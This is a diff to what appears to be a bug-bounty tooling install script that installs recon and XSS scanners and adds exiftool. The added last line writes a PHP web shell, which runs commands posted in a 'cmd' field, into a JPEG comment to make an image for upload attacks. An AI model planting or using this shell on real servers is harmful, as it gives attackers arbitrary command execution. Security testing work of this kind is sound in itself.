@@ -26,7 +26,7 @@ go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
 go install github.com/tomnomnom/httprobe@latest
 
 ## install outils kali (Unzip Amass - Enum - pip - dnsrecon - ffuf)
-apt install unzip amass enum python3-pip dnsrecon ffuf -y
+apt install unzip amass enum python3-pip dnsrecon ffuf exiftool -y
 
 ## install Dalfox
 go install github.com/hahwul/dalfox/v2@latest
@@ -40,3 +40,6 @@ wget 'https://github.com/UltimateHackers/XSStrike/archive/master.zip'
 tar xzf master.zip 
 wget 'https://raw.githubusercontent.com/SnowGlobeio/Bugbounty/main/rapide.txt' -O ~/XSStrike-master/rapide.txt
 python3 XSStrike-master/xsstrike.py
+
+## Create img CMD
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
